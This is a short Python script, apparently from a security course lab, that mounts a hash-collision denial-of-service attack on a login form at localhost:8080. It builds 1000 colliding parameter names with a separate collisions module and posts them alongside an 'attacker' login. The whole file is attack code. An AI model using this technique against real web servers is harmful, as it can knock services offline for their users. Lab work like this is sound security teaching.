from requests import codes, Session
from collisions import find_collisions

LOGIN_FORM_URL = "http://localhost:8080/login"

# This function will send the login form
# with the colliding parameters you specify.


def do_login_form(sess, username, password, params=None):
    data_dict = {"username": username,
                 "password": password,
                 "login": "Login"
                 }
    if not params is None:
        data_dict.update(params)
    response = sess.post(LOGIN_FORM_URL, data_dict)
    print(response)


def do_attack():
    sess = Session()
  # Choose any valid username and password
    uname = "attacker"
    pw = "attacker"
  # Put your colliding inputs in this dictionary as parameters.
    colls = find_collisions(b"\x00" * 16, n=1000)
    print(colls)
    attack_dict = {
        c: i for i, c in enumerate(colls)
    }
    response = do_login_form(sess, uname, pw, attack_dict)


if __name__ == '__main__':
    do_attack()
